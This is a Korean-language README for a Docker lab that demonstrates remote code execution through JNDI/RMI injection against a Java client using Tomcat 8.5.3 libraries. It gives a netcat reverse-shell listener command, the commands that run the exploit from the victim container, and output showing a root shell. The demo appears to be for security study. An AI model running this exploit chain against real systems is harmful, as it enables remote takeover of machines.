# RMI-RCE-Demo
ref. https://github.com/zer0-map/JNDI-Injection-Series/tree/main

![image-001](/images/img-001.png)

## 요구사항
```bash
$ java -version
openjdk version "1.8.0_181"
OpenJDK Runtime Environment (Zulu 8.31.0.1-macosx) (build 1.8.0_181-b02)
OpenJDK 64-Bit Server VM (Zulu 8.31.0.1-macosx) (build 25.181-b02, mixed mode)
```

## 설치 및 공격자 리버스 셸 대기

1. docker-compose 실행
    ```bash
    $ docker-compose up -d
    ```

2. 호스트 PC(공격자) 리버스 셸 준비
    ```bash
    $ nc -lv 9999
    ```

## Exploit

1. 피해자 PC(rmi-client 컨테이너) 접속
    ```bash
    $ docker exec -it rmi-client /bin/bash
    ```

2. Exploit 수행(악성 rmi-server 요청) 
    ```bash
    $ java -classpath build:libs/tomcat-catalina-8.5.3.jar:libs/tomcat-embed-el-8.5.3.jar RmiClient rmi-server
    ```

## 리버스 셸 검증
1. 호스트 PC에서 리버스 셸 연결 확인
    ```bash
    $ id
    uid=0(root) gid=0(root) groups=0(root)
    $ ls -al
    total 24
    drwxr-xr-x 1 root root 4096 Aug  3 20:02 .
    drwxr-xr-x 1 root root 4096 Aug  3 20:12 ..
    drwxr-xr-x 1 root root 4096 Aug  3 20:03 build
    drwxr-xr-x 2 root root 4096 Aug  3 18:35 libs
    drwxr-xr-x 2 root root 4096 Aug  3 19:50 src
    ```

## 기타 명령어
- 빌드
    ```bash
    $ javac -d ./build -classpath libs/tomcat-embed-el-8.5.3.jar:libs/tomcat-catalina-8.5.3.jar ./src/RmiClient.java 
    $ javac -d ./build -classpath libs/tomcat-embed-el-8.5.3.jar:libs/tomcat-catalina-8.5.3.jar ./src/RmiServer.java 
    ```

- 실행
    ```bash
    # RmiServer
    $ java -classpath build:libs/tomcat-catalina-8.5.3.jar:libs/tomcat-embed-el-8.5.3.jar RmiServer
    # RmiClient
    # [HOST_IP]에 RmiServer가 동작 중인 Host의 IP를 작성한다.
    $ java -classpath build:libs/tomcat-catalina-8.5.3.jar:libs/tomcat-embed-el-8.5.3.jar RmiClient [HOST_IP]
    ```bash